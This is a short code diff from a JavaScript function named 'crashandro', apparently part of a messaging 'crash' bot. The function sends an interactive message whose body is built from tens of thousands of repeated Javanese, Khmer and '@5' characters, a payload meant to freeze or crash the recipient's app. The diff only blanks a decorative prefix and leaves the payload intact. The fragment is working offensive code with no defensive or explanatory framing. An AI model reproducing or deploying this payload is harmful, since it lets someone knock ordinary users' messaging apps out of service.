@@ -798,7 +798,7 @@ async function crashandro(client, X) {
         message: {
           interactiveMessage: {
             body: {
-              ٖtext: "🦠</🧬⃟༑⌁𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗘𝗥" +
+              ٖtext: "" +
               "ꦽ".repeat(25000) +
               "ោ៝".repeat(20000) +
               "@5".repeat(50000),
